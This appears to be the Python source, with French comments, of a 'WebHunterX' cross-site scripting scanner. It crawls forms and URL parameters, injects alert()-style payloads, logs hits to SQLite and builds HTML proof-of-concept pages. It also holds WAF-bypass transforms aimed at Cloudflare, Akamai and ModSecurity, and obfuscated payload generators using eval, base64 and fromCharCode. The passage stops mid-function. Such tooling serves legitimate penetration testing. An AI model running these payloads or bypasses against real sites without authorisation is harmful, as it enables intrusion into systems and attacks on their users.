#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import json
import time
import logging
import requests
import tempfile
import urllib.parse
from typing import List, Dict, Any, Tuple, Optional, Union
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
import html
import argparse

# Importation des modules internes
try:
    # On ajoute le répertoire parent au sys.path pour permettre les imports
    import sys
    sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
    
    from utils.http_tools import HTTPClient
    from utils.logger import setup_logger
except ImportError as e:
    print(f"Erreur d'importation: {e}")
    sys.exit(1)

# Configuration du logger
logger = setup_logger('xss')

class XSSScanner:
    """
    Scanner de vulnérabilités Cross-Site Scripting (XSS)
    """
    
    def __init__(self, target, options=None, http_config=None):
        """
        Initialise le scanner XSS
        
        Args:
            target: URL cible à scanner
            options: Options de configuration
            http_config: Configuration HTTP
        """
        self.target = target
        self.options = options or {}
        self.http_config = http_config or {}
        
        # Initialisation des options
        self.recursive = self.options.get('recursive', False)
        self.max_depth = self.options.get('depth', 2)
        self.timeout = self.options.get('timeout', 10)
        self.test_types = self.options.get('test_types', ['basic', 'img', 'svg', 'event'])
        
        # Configuration HTTP
        self.headers = self.http_config.get('headers', {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WebHunterX/1.0'
        })
        
        if 'cookies' in self.http_config:
            self.cookies = self.http_config['cookies']
            if isinstance(self.cookies, str):
                # Conversion de la chaîne de cookies en dictionnaire
                cookie_dict = {}
                for cookie in self.cookies.split(';'):
                    if '=' in cookie:
                        name, value = cookie.strip().split('=', 1)
                        cookie_dict[name] = value
                self.cookies = cookie_dict
        else:
            self.cookies = {}
        
        # Création d'une session HTTP
        self.http = requests.Session()
        self.http.headers.update(self.headers)
        self.http.cookies.update(self.cookies)
        
        # Initialisation des structures de données
        self.visited_urls = set()
        self.injection_points = []
        self.vulnerabilities = []
        
        # Statistiques
        self.stats = {
            'urls_scanned': 0,
            'forms_analyzed': 0,
            'parameters_tested': 0,
            'vulnerabilities_found': 0,
            'time_elapsed': 0
        }
        
        # Chargement des payloads
        self.payloads = self._load_payloads()
        
        # Initialisation de la base de données
        self.db_conn = self._init_database()
        
        logger.info(f"Scanner XSS initialisé pour {self.target}")

    def _load_payloads(self) -> Dict[str, List[str]]:
        """
        Charge les payloads XSS depuis le fichier
        
        Returns:
            Dictionnaire des payloads par type
        """
        # Essayer plusieurs chemins possibles pour trouver le fichier de payloads
        possible_paths = [
            os.path.join(os.path.dirname(os.path.dirname(__file__)), 'payloads', 'xss.txt'),
            os.path.join(os.path.dirname(__file__), 'payloads', 'xss.txt'),
            os.path.join('payloads', 'xss.txt'),
            os.path.join(os.getcwd(), 'payloads', 'xss.txt')
        ]
        
        payloads = {
            'basic': [],
            'img': [],
            'svg': [],
            'div': [],
            'input': [],
            'iframe': [],
            'a': [],
            'obfuscated': [],
            'dom': [],
            'css': [],
            'event': [],
            'waf_bypass': [],
            'polyglots': [],
            'cookie_stealers': []
        }
        
        # Vérifier l'existence du fichier dans les chemins possibles
        xss_file = None
        for path in possible_paths:
            if os.path.exists(path):
                xss_file = path
                break
        
        if not xss_file:
            logger.warning(f"Fichier de payloads non trouvé. Recherché dans: {possible_paths}")
            # Payloads par défaut
            payloads['basic'] = ["<script>alert('XSS')</script>", "<script>alert(1)</script>"]
            payloads['img'] = ["<img src=x onerror=alert('XSS')>", "<img src=x onerror=alert(1)>"]
            payloads['svg'] = ["<svg onload=alert('XSS')>", "<svg onload=alert(1)>"]
            return payloads
            
        # Lire le fichier de payloads
        try:
            logger.info(f"Chargement des payloads depuis {xss_file}")
            with open(xss_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                
            current_section = 'basic'  # Section par défaut
            
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                # Détection des sections
                if line.startswith('[') and line.endswith(']'):
                    section = line[1:-1].lower()
                    if section in payloads:
                        current_section = section
                    continue
                
                # Ajout du payload à la section actuelle
                payloads[current_section].append(line)
                
        except Exception as e:
            logger.error(f"Erreur lors du chargement des payloads: {e}")
            
        return payloads

    def _init_database(self):
        """
        Initialise la base de données SQLite pour stocker les résultats
        
        Returns:
            Connexion à la base de données
        """
        try:
            import sqlite3
            
            # Créer le répertoire de données s'il n'existe pas
            data_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'data')
            os.makedirs(data_dir, exist_ok=True)
            
            # Ouvrir la connexion
            db_path = os.path.join(data_dir, 'webhunterx.db')
            conn = sqlite3.connect(db_path)
            
            # Créer les tables si elles n'existent pas
            cursor = conn.cursor()
            
            # Table des vulnérabilités XSS
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS xss_vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT NOT NULL,
                injection_point TEXT NOT NULL,
                payload TEXT NOT NULL,
                vulnerability_type TEXT NOT NULL,
                proof TEXT,
                notes TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            ''')
            
            # Table des formulaires analysés
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS xss_forms (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT NOT NULL,
                form_action TEXT,
                form_method TEXT,
                form_inputs TEXT,
                is_vulnerable BOOLEAN DEFAULT 0,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            ''')
            
            conn.commit()
            return conn
            
        except ImportError:
            logger.warning("Module sqlite3 non disponible, stockage des résultats désactivé")
            return None
        except Exception as e:
            logger.error(f"Erreur lors de l'initialisation de la base de données: {e}")
            return None

    def crawl(self):
        """
        Explore le site pour trouver des points d'injection
        """
        logger.info(f"Exploration du site {self.target} pour trouver des points d'injection...")
        
        try:
            # Envoyer une requête pour obtenir la page
            response = self.http.get(self.target)
            
            # Extraire les formulaires
            self._extract_forms(self.target, response.text)
            
            # Extraire les paramètres GET
            self._extract_url_parameters(self.target)
            
            # Extraire les événements JS/DOM
            self._extract_dom_events(self.target, response.text)
            
            logger.info(f"Points d'injection trouvés: {len(self.injection_points)}")
            
        except Exception as e:
            logger.error(f"Erreur lors du crawl de {self.target}: {e}")
    
    def _extract_forms(self, url, html_content):
        """
        Extrait les formulaires d'une page HTML
        
        Args:
            url: URL de la page
            html_content: Contenu HTML de la page
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            logger.info(f"Formulaires trouvés: {len(forms)}")
            self.stats['forms_analyzed'] += len(forms)
            
            for form in forms:
                form_action = form.get('action', '')
                if form_action:
                    # Convertir l'URL relative en absolue si nécessaire
                    form_action = urljoin(url, form_action)
                else:
                    form_action = url
                
                form_method = form.get('method', 'get').lower()
                
                # Collecter tous les champs de saisie
                inputs = []
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_name = input_tag.get('name')
                    if input_name:
                        input_type = input_tag.get('type', 'text').lower()
                        # Ignorer les champs cachés, submit, button, etc.
                        if input_type not in ['hidden', 'submit', 'button', 'image', 'reset', 'file']:
                            inputs.append({
                                'name': input_name,
                                'type': input_type
                            })
                
                if inputs:
                    injection_point = {
                        'type': 'form',
                        'url': url,
                        'action': form_action,
                        'method': form_method,
                        'inputs': inputs
                    }
                    self.injection_points.append(injection_point)
                    
                    # Enregistrer le formulaire dans la base de données
                    if self.db_conn:
                        try:
                            cursor = self.db_conn.cursor()
                            cursor.execute('''
                            INSERT INTO xss_forms (url, form_action, form_method, form_inputs)
                            VALUES (?, ?, ?, ?)
                            ''', (url, form_action, form_method, json.dumps(inputs)))
                            self.db_conn.commit()
                        except Exception as e:
                            logger.error(f"Erreur lors de l'enregistrement du formulaire: {e}")
                    
                    logger.debug(f"Formulaire trouvé: {form_action} ({form_method}) avec {len(inputs)} champs")
        
        except Exception as e:
            logger.error(f"Erreur lors de l'extraction des formulaires: {e}")
    
    def _extract_url_parameters(self, url):
        """
        Extrait les paramètres d'une URL
        
        Args:
            url: URL à analyser
        """
        try:
            parsed_url = urlparse(url)
            
            # Extraire les paramètres de l'URL
            query_params = parse_qs(parsed_url.query)
            
            if query_params:
                # Créer un point d'injection pour chaque paramètre
                for param_name in query_params:
                    injection_point = {
                        'type': 'url',
                        'url': url,
                        'param': param_name,
                        'method': 'get'
                    }
                    self.injection_points.append(injection_point)
                    
                    logger.debug(f"Paramètre URL trouvé: {param_name} dans {url}")
        
        except Exception as e:
            logger.error(f"Erreur lors de l'extraction des paramètres URL: {e}")
    
    def _extract_dom_events(self, url, html_content):
        """
        Extrait les événements DOM d'une page HTML
        
        Args:
            url: URL de la page
            html_content: Contenu HTML de la page
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Liste des événements DOM à rechercher
            dom_events = [
                'onclick', 'onmouseover', 'onmouseout', 'onkeydown', 'onkeypress', 'onkeyup',
                'onchange', 'onsubmit', 'onload', 'onerror', 'onfocus', 'onblur'
            ]
            
            # Rechercher les éléments avec des événements
            for event in dom_events:
                elements = soup.find_all(attrs={event: True})
                
                for element in elements:
                    injection_point = {
                        'type': 'dom',
                        'url': url,
                        'event': event,
                        'element': element.name,
                        'code': element[event]
                    }
                    self.injection_points.append(injection_point)
                    
                    logger.debug(f"Événement DOM trouvé: {event} sur {element.name} dans {url}")
        
        except Exception as e:
            logger.error(f"Erreur lors de l'extraction des événements DOM: {e}")
    
    def _is_reflected(self, url, payload, response_text):
        """
        Vérifie si un payload est réfléchi dans la réponse
        
        Args:
            url: URL testée
            payload: Payload injecté
            response_text: Texte de la réponse
            
        Returns:
            True si le payload est réfléchi, False sinon
        """
        # Nettoyer le payload pour la recherche
        clean_payload = payload.replace('<', '').replace('>', '')
        
        # Vérifier si le payload brut est présent
        if payload in response_text:
            return True
        
        # Vérifier la présence du contenu du script ou de l'alerte
        if 'alert(' in payload:
            alert_match = re.search(r'alert\([\'"]?([^\'"]+)[\'"]?\)', payload)
            if alert_match and alert_match.group(1) in response_text:
                return True
        
        return False

    def test_injection_point(self, injection_point):
        """
        Teste un point d'injection avec différents payloads
        
        Args:
            injection_point: Dictionnaire contenant les informations sur le point d'injection
            
        Returns:
            Liste des vulnérabilités trouvées
        """
        vulnerabilities = []
        
        logger.info(f"Test du point d'injection: {injection_point['type']} dans {injection_point['url']}")
        
        # Choisir les payloads en fonction du type de test
        all_payloads = []
        for test_type in self.test_types:
            if test_type in self.payloads:
                all_payloads.extend([(test_type, p) for p in self.payloads[test_type]])
        
        # Si aucun payload n'est disponible, utiliser ceux par défaut
        if not all_payloads:
            all_payloads = [('basic', p) for p in self.payloads['basic']]
        
        # Tester chaque payload
        for test_type, payload in all_payloads:
            self.stats['parameters_tested'] += 1
            
            if injection_point['type'] == 'url':
                vuln = self._test_url_parameter(injection_point, test_type, payload)
                if vuln:
                    vulnerabilities.append(vuln)
            
            elif injection_point['type'] == 'form':
                vuln = self._test_form_input(injection_point, test_type, payload)
                if vuln:
                    vulnerabilities.append(vuln)
            
            elif injection_point['type'] == 'dom':
                # Les vulnérabilités DOM-based sont plus complexes à détecter automatiquement
                # On pourrait implémenter une approche plus avancée ici
                pass
        
        return vulnerabilities

    def _test_url_parameter(self, injection_point, test_type, payload):
        """
        Teste un paramètre d'URL avec un payload
        
        Args:
            injection_point: Dictionnaire contenant les informations sur le point d'injection
            test_type: Type de test (basic, img, svg, etc.)
            payload: Payload à tester
            
        Returns:
            Dictionnaire contenant les informations sur la vulnérabilité ou None
        """
        try:
            url = injection_point['url']
            param = injection_point['param']
            
            # Construire l'URL avec le payload
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            # Remplacer la valeur du paramètre par le payload
            query_params[param] = [payload]
            
            # Reconstruire la query string
            new_query = urlencode(query_params, doseq=True)
            
            # Reconstruire l'URL
            parts = list(parsed_url)
            parts[4] = new_query
            new_url = urlunparse(parts)
            
            # Envoyer la requête
            response = self.http.get(new_url)
            
            # Vérifier si le payload est réfléchi dans la réponse
            if self._is_reflected(url, payload, response.text):
                vuln = {
                    'type': 'xss',
                    'url': url,
                    'injection_point': f"URL parameter: {param}",
                    'payload': payload,
                    'payload_type': test_type,
                    'method': 'GET',
                    'proof_url': new_url,
                    'response_code': response.status_code,
                    'reflection': True
                }
                
                logger.warning(f"Vulnérabilité XSS détectée dans le paramètre URL {param} avec payload: {payload}")
                
                # Enregistrer la vulnérabilité dans la base de données
                if self.db_conn:
                    try:
                        cursor = self.db_conn.cursor()
                        cursor.execute('''
                        INSERT INTO xss_vulnerabilities (url, injection_point, payload, vulnerability_type, proof)
                        VALUES (?, ?, ?, ?, ?)
                        ''', (url, f"URL parameter: {param}", payload, test_type, new_url))
                        self.db_conn.commit()
                    except Exception as e:
                        logger.error(f"Erreur lors de l'enregistrement de la vulnérabilité: {e}")
                
                return vuln
        
        except Exception as e:
            logger.error(f"Erreur lors du test du paramètre URL {param}: {e}")
        
        return None

    def _test_form_input(self, injection_point, test_type, payload):
        """
        Teste un champ de formulaire avec un payload
        
        Args:
            injection_point: Dictionnaire contenant les informations sur le point d'injection
            test_type: Type de test (basic, img, svg, etc.)
            payload: Payload à tester
            
        Returns:
            Dictionnaire contenant les informations sur la vulnérabilité ou None
        """
        try:
            url = injection_point['url']
            action = injection_point['action']
            method = injection_point['method']
            inputs = injection_point['inputs']
            
            # Construire les données du formulaire
            form_data = {}
            injection_field = None
            
            # Remplir tous les champs avec des valeurs par défaut
            for input_info in inputs:
                input_name = input_info['name']
                input_type = input_info.get('type', 'text')
                
                # Valeur par défaut en fonction du type
                if input_type == 'email':
                    form_data[input_name] = 'test@example.com'
                elif input_type == 'number':
                    form_data[input_name] = '123'
                elif input_type == 'tel':
                    form_data[input_name] = '1234567890'
                else:
                    form_data[input_name] = 'test'
            
            # Tester chaque champ un par un
            for input_info in inputs:
                input_name = input_info['name']
                
                # Sauvegarder la valeur originale
                original_value = form_data[input_name]
                
                # Remplacer par le payload
                form_data[input_name] = payload
                injection_field = input_name
                
                # Envoyer la requête
                if method.lower() == 'post':
                    response = self.http.post(action, data=form_data)
                else:
                    # Pour GET, convertir les données en paramètres d'URL
                    response = self.http.get(action, params=form_data)
                
                # Vérifier si le payload est réfléchi dans la réponse
                if self._is_reflected(action, payload, response.text):
                    vuln = {
                        'type': 'xss',
                        'url': url,
                        'form_action': action,
                        'injection_point': f"Form input: {input_name}",
                        'payload': payload,
                        'payload_type': test_type,
                        'method': method.upper(),
                        'form_data': form_data.copy(),
                        'response_code': response.status_code,
                        'reflection': True
                    }
                    
                    logger.warning(f"Vulnérabilité XSS détectée dans le champ de formulaire {input_name} avec payload: {payload}")
                    
                    # Enregistrer la vulnérabilité dans la base de données
                    if self.db_conn:
                        try:
                            cursor = self.db_conn.cursor()
                            cursor.execute('''
                            INSERT INTO xss_vulnerabilities (url, injection_point, payload, vulnerability_type, proof)
                            VALUES (?, ?, ?, ?, ?)
                            ''', (url, f"Form input: {input_name} in {action}", payload, test_type, json.dumps(form_data)))
                            
                            # Mettre à jour le formulaire comme vulnérable
                            cursor.execute('''
                            UPDATE xss_forms SET is_vulnerable = 1 WHERE form_action = ?
                            ''', (action,))
                            
                            self.db_conn.commit()
                        except Exception as e:
                            logger.error(f"Erreur lors de l'enregistrement de la vulnérabilité: {e}")
                    
                    return vuln
                
                # Restaurer la valeur originale pour le prochain test
                form_data[input_name] = original_value
        
        except Exception as e:
            logger.error(f"Erreur lors du test du formulaire {action}: {e}")
        
        return None

    def scan(self):
        """
        Lance le scan des vulnérabilités XSS
        
        Returns:
            Liste des vulnérabilités trouvées
        """
        start_time = time.time()
        
        # S'assurer que nous avons des points d'injection
        if not self.injection_points:
            logger.info("Aucun point d'injection trouvé, lancement du crawl...")
            self.crawl()
        
        logger.info(f"Début du scan XSS sur {len(self.injection_points)} points d'injection...")
        
        # Tester chaque point d'injection
        for injection_point in self.injection_points:
            try:
                vulns = self.test_injection_point(injection_point)
                if vulns:
                    self.vulnerabilities.extend(vulns)
                    self.stats['vulnerabilities_found'] += len(vulns)
            except Exception as e:
                logger.error(f"Erreur lors du test du point d'injection: {e}")
        
        end_time = time.time()
        self.stats['time_elapsed'] = end_time - start_time
        
        logger.info(f"Scan terminé en {self.stats['time_elapsed']:.2f} secondes")
        logger.info(f"Statistiques: {self.stats['urls_scanned']} URLs scannées, {self.stats['forms_analyzed']} formulaires analysés, {self.stats['parameters_tested']} paramètres testés")
        logger.info(f"Vulnérabilités trouvées: {self.stats['vulnerabilities_found']}")
        
        return self.vulnerabilities

    def generate_report(self, output_file=None):
        """
        Génère un rapport détaillé des vulnérabilités XSS trouvées
        
        Args:
            output_file: Chemin du fichier de sortie
            
        Returns:
            Dictionnaire contenant le rapport
        """
        if not output_file:
            output_file = f"xss_report_{int(time.time())}.json"
        
        report = {
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target': self.target,
            'statistics': self.stats,
            'vulnerabilities': []
        }
        
        for vuln in self.vulnerabilities:
            # Créer un PoC HTML pour chaque vulnérabilité
            poc_html = self.generate_poc(vuln)
            
            vuln_info = {
                'url': vuln['url'],
                'injection_point': vuln.get('injection_point', ''),
                'method': vuln.get('method', 'GET'),
                'payload': vuln['payload'],
                'payload_type': vuln.get('payload_type', 'basic'),
                'severity': self._determine_severity(vuln),
                'proof': vuln.get('proof_url', '') or json.dumps(vuln.get('form_data', {})),
                'poc_html': poc_html
            }
            
            report['vulnerabilities'].append(vuln_info)
        
        # Enregistrer le rapport dans un fichier
        try:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=4)
            logger.info(f"Rapport enregistré dans {output_file}")
        except Exception as e:
            logger.error(f"Erreur lors de l'enregistrement du rapport: {e}")
        
        return report

    def generate_poc(self, vulnerability):
        """
        Génère une preuve de concept HTML pour la vulnérabilité
        
        Args:
            vulnerability: Dictionnaire contenant les informations sur la vulnérabilité
            
        Returns:
            Code HTML de la preuve de concept
        """
        try:
            poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - WebHunterX</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #d9534f; }}
        .info {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        .payload {{ background-color: #f0f0f0; padding: 10px; border-left: 3px solid #d9534f; overflow-wrap: break-word; }}
        button {{ background-color: #d9534f; color: white; border: none; padding: 10px 15px; cursor: pointer; }}
        iframe {{ width: 100%; height: 300px; border: 1px solid #ddd; margin-top: 20px; }}
    </style>
</head>
<body>
    <h1>Preuve de Concept XSS - WebHunterX</h1>
    <div class="info">
        <h3>Informations sur la vulnérabilité</h3>
        <p><strong>URL:</strong> {vulnerability['url']}</p>
        <p><strong>Point d'injection:</strong> {vulnerability.get('injection_point', 'N/A')}</p>
        <p><strong>Méthode:</strong> {vulnerability.get('method', 'GET')}</p>
        <p><strong>Type de payload:</strong> {vulnerability.get('payload_type', 'basic')}</p>
        <p><strong>Sévérité:</strong> {self._determine_severity(vulnerability)}</p>
    </div>
    
    <h3>Payload XSS</h3>
    <div class="payload">{html.escape(vulnerability['payload'])}</div>
    
"""
            
            # Ajouter un formulaire de test ou un lien en fonction du type de vulnérabilité
            if vulnerability.get('method') == 'POST' and 'form_data' in vulnerability:
                # Créer un formulaire POST pour tester la vulnérabilité
                form_action = vulnerability.get('form_action', vulnerability['url'])
                form_data = vulnerability.get('form_data', {})
                
                poc_html += f"""
    <h3>Tester la vulnérabilité</h3>
    <form id="xss_form" action="{form_action}" method="POST" target="result_frame">
"""
                
                for field_name, field_value in form_data.items():
                    poc_html += f'        <input type="hidden" name="{field_name}" value="{html.escape(str(field_value))}">\n'
                
                poc_html += """
        <button type="submit">Exécuter le PoC</button>
    </form>
"""
            else:
                # Créer un lien pour les vulnérabilités GET
                proof_url = vulnerability.get('proof_url', vulnerability['url'])
                
                poc_html += f"""
    <h3>Tester la vulnérabilité</h3>
    <button onclick="document.getElementById('result_frame').src='{proof_url}'">Exécuter le PoC</button>
"""
            
            # Ajouter un iframe pour afficher les résultats
            poc_html += """
    <h3>Résultat</h3>
    <iframe id="result_frame" name="result_frame" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
    
    <script>
        // Code pour détecter si le XSS a fonctionné
        window.addEventListener('message', function(event) {
            if (event.data.type === 'xss_detected') {
                alert('XSS detected: ' + event.data.payload);
            }
        });
    </script>
</body>
</html>"""
            
            return poc_html
            
        except Exception as e:
            logger.error(f"Erreur lors de la génération du PoC: {e}")
            return f"<html><body><h1>Erreur lors de la génération du PoC</h1><p>{str(e)}</p></body></html>"

    def _determine_severity(self, vulnerability):
        """
        Détermine la sévérité d'une vulnérabilité XSS
        
        Args:
            vulnerability: Dictionnaire contenant les informations sur la vulnérabilité
            
        Returns:
            Niveau de sévérité (High, Medium, Low)
        """
        payload = vulnerability['payload']
        payload_type = vulnerability.get('payload_type', 'basic')
        
        # Les payloads qui permettent d'exécuter du JavaScript sont plus dangereux
        if 'alert(' in payload or 'eval(' in payload or 'document.cookie' in payload:
            return 'High'
        
        # Les payloads qui permettent d'injecter des balises <script> sont moyennement dangereux
        if '<script>' in payload:
            return 'Medium'
        
        # Les payloads qui permettent d'injecter des événements sont moins dangereux
        if 'onmouseover' in payload or 'onclick' in payload:
            return 'Medium'
        
        # Les payloads qui permettent seulement d'injecter des balises HTML sont moins dangereux
        return 'Low'

    def _load_bypass_techniques(self):
        """
        Charge les techniques de bypass WAF
        
        Returns:
            Dictionnaire des techniques de bypass par type de WAF
        """
        bypass_techniques = {
            'generic': [
                {'description': 'Encodage hexadécimal', 'transform': lambda p: p.replace('<', '&#x3c;').replace('>', '&#x3e;')},
                {'description': 'Encodage décimal', 'transform': lambda p: p.replace('<', '&#60;').replace('>', '&#62;')},
                {'description': 'Double encodage', 'transform': lambda p: p.replace('<', '%253c').replace('>', '%253e')},
                {'description': 'Mélange de casse', 'transform': lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p))},
                {'description': 'Insertion d\'espaces', 'transform': lambda p: p.replace('script', 'scr ipt').replace('alert', 'ale rt')}
            ],
            'cloudflare': [
                {'description': 'Bypass Cloudflare', 'transform': lambda p: p.replace('<', '<A>').replace('>', '</A>')}
            ],
            'akamai': [
                {'description': 'Bypass Akamai', 'transform': lambda p: p.replace('script', 'scri\npt')}
            ],
            'modsecurity': [
                {'description': 'Bypass ModSecurity', 'transform': lambda p: p.replace('<script>', '<script/x>')}
            ]
        }
        
        return bypass_techniques
        
    def _apply_bypass_techniques(self, payload, waf_type=None):
        """
        Applique des techniques de bypass WAF à un payload
        
        Args:
            payload: Payload XSS original
            waf_type: Type de WAF (optional)
            
        Returns:
            Liste des payloads modifiés
        """
        bypass_techniques = self._load_bypass_techniques()
        modified_payloads = []
        
        # Appliquer les techniques génériques
        for technique in bypass_techniques['generic']:
            try:
                modified_payload = technique['transform'](payload)
                modified_payloads.append({
                    'payload': modified_payload,
                    'description': f"Bypass générique: {technique['description']}"
                })
            except Exception as e:
                logger.error(f"Erreur lors de l'application de la technique de bypass {technique['description']}: {e}")
        
        # Appliquer les techniques spécifiques au WAF si un type est fourni
        if waf_type and waf_type in bypass_techniques:
            for technique in bypass_techniques[waf_type]:
                try:
                    modified_payload = technique['transform'](payload)
                    modified_payloads.append({
                        'payload': modified_payload,
                        'description': f"Bypass {waf_type}: {technique['description']}"
                    })
                except Exception as e:
                    logger.error(f"Erreur lors de l'application de la technique de bypass {technique['description']}: {e}")
        
        return modified_payloads
    
    def generate_custom_payloads(self, base_payload=None, waf_type=None, obfuscation_level=1):
        """
        Génère des payloads XSS personnalisés avec différentes techniques
        
        Args:
            base_payload: Payload de base à utiliser (si None, utilise un payload par défaut)
            waf_type: Type de WAF à contourner
            obfuscation_level: Niveau d'obfuscation (1-3)
            
        Returns:
            Liste de payloads personnalisés
        """
        if not base_payload:
            base_payload = "<script>alert('XSS')</script>"
        
        custom_payloads = []
        
        # Ajouter le payload de base
        custom_payloads.append({
            'payload': base_payload,
            'description': 'Payload de base'
        })
        
        # Appliquer les techniques de bypass WAF
        bypass_payloads = self._apply_bypass_techniques(base_payload, waf_type)
        # Vérifier que chaque payload a une description
        for bp in bypass_payloads:
            if 'description' not in bp:
                bp['description'] = f"Technique de bypass WAF ({waf_type or 'générique'})"
        
        custom_payloads.extend(bypass_payloads)
        
        # Appliquer les techniques d'obfuscation en fonction du niveau
        if obfuscation_level >= 1:
            # Niveau 1: Obfuscation simple
            js_payload = "alert('XSS')"
            if "alert" in base_payload:
                # Obfuscation simple de la fonction alert
                obf_payload = base_payload.replace("alert", "al\u0065rt")
                custom_payloads.append({
                    'payload': obf_payload,
                    'description': 'Obfuscation Unicode simple'
                })
                
                # Utilisation de eval
                eval_payload = base_payload.replace("alert('XSS')", "eval('al'+'ert(\\'XSS\\')')")
                custom_payloads.append({
                    'payload': eval_payload,
                    'description': 'Utilisation de eval pour l\'obfuscation'
                })
        
        if obfuscation_level >= 2:
            # Niveau 2: Obfuscation intermédiaire
            if "alert" in base_payload:
                # Encodage en base64
                import base64
                b64_js = base64.b64encode("alert('XSS')".encode()).decode()
                b64_payload = f"<script>eval(atob('{b64_js}'))</script>"
                custom_payloads.append({
                    'payload': b64_payload,
                    'description': 'Encodage Base64'
                })
                
                # Utilisation de fromCharCode
                char_codes = ','.join([str(ord(c)) for c in "alert('XSS')"])
                charcode_payload = f"<script>eval(String.fromCharCode({char_codes}))</script>"
                custom_payloads.append({
                    'payload': charcode_payload,
                    'description': 'Utilisation de fromCharCode'
                })
        
        if obfuscation_level >= 3:
            # Niveau 3: Obfuscation avancée
            if "alert" in base_payload:
                # Mélange de plusieurs techniques
                js_parts = []
                for c in "alert('XSS')":
                    r = ord(c)
                    js_parts.append(f"String.fromCharCode({r})")
                
                joined_js = "+".join(js_parts)
                advanced_payload = f"<script>setTimeout(Function({joined_js}),100)</script>"
                custom_payloads.append({
                    'payload': advanced_payload,
                    'description': 'Obfuscation avancée multi-techniques'
                })
                
                # Utilisation d'événements DOM
                dom_payload = "<svg/onload=setTimeout(\\x61lert('XSS'))>"
                custom_payloads.append({
                    'payload': dom_payload,
                    'description': 'Exploitation d\'événements DOM avec obfuscation'
                })
        
        # Vérifier que tous les payloads ont une description
        for payload in custom_payloads:
            if 'description' not in payload:
                payload['description'] = "Payload personnalisé"
        
        return custom_payloads

    def run(self, output_file=None):
        """
        Exécute le scan complet et génère un rapport
        
        Args:
            output_file: Chemin du fichier de sortie pour le rapport
            
        Returns:
            Dictionnaire contenant le rapport
        """
        try:
            logger.info(f"Démarrage du scan XSS sur {self.target}")
            
            # Étape 1: Exploration du site pour trouver des points d'injection
            logger.info("Étape 1: Exploration du site")
            self.crawl()
            
            # Étape 2: Test des points d'injection trouvés
            logger.info("Étape 2: Test des points d'injection")
            self.scan()
            
            # Étape 3: Génération du rapport
            logger.info("Étape 3: Génération du rapport")
            report = self.generate_report(output_file)
            
            return report
            
        except Exception as e:
            logger.error(f"Erreur lors de l'exécution du scanner XSS: {e}")
            return {'error': str(e)}

    def _test_browser_security_features(self):
        """
        Teste les mécanismes de sécurité des navigateurs pour détecter les vulnérabilités
        
        Returns:
            Dictionnaire contenant les résultats des tests
        """
        results = {
            'xss_auditor': None,
            'xss_protection_header': None,
            'content_security_policy': None,
            'browser_detection': []
        }
        
        try:
            # Test du header X-XSS-Protection
            logger.info("Test du header X-XSS-Protection")
            response = self.http.get(self.target)
            
            if 'X-XSS-Protection' in response.headers:
                xss_protection = response.headers['X-XSS-Protection']
                results['xss_protection_header'] = xss_protection
                
                if xss_protection == '0':
                    logger.warning("X-XSS-Protection est désactivé (0)")
                elif '1; mode=block' in xss_protection:
                    logger.info("X-XSS-Protection est activé avec mode=block")
                else:
                    logger.info(f"X-XSS-Protection est configuré avec: {xss_protection}")
            else:
                logger.info("Header X-XSS-Protection non détecté")
                results['xss_protection_header'] = 'non présent'
            
            # Test du Content-Security-Policy
            if 'Content-Security-Policy' in response.headers:
                csp = response.headers['Content-Security-Policy']
                results['content_security_policy'] = csp
                logger.info(f"Content-Security-Policy détecté: {csp}")
                
                # Analyse basique du CSP
                csp_directives = {}
                for directive in csp.split(';'):
                    if directive.strip():
                        parts = directive.strip().split(' ', 1)
                        if len(parts) > 1:
                            directive_name, directive_value = parts
                            csp_directives[directive_name] = directive_value
                
                # Vérifier les faiblesses potentielles du CSP
                if 'script-src' in csp_directives:
                    script_src = csp_directives['script-src']
                    if 'unsafe-inline' in script_src:
                        logger.warning("CSP permet 'unsafe-inline' pour script-src")
                    if 'unsafe-eval' in script_src:
                        logger.warning("CSP permet 'unsafe-eval' pour script-src")
                    if '*' in script_src:
                        logger.warning("CSP utilise des wildcards (*) dans script-src")
                else:
                    logger.warning("CSP ne spécifie pas de directive script-src")
                
                # Vérifier si default-src peut compenser l'absence de script-src
                if 'default-src' in csp_directives and 'script-src' not in csp_directives:
                    default_src = csp_directives['default-src']
                    if 'unsafe-inline' in default_src:
                        logger.warning("CSP permet 'unsafe-inline' via default-src")
                    if 'unsafe-eval' in default_src:
                        logger.warning("CSP permet 'unsafe-eval' via default-src")
                    if '*' in default_src:
                        logger.warning("CSP utilise des wildcards (*) dans default-src")
                
            else:
                logger.info("Content-Security-Policy non détecté")
                results['content_security_policy'] = 'non présent'
            
            # Détection de navigateur via le User-Agent
            logger.info("Test de détection de navigateur")
            
            # Tester différents User-Agents pour détecter les comportements différents
            browser_tests = [
                {"name": "Chrome", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
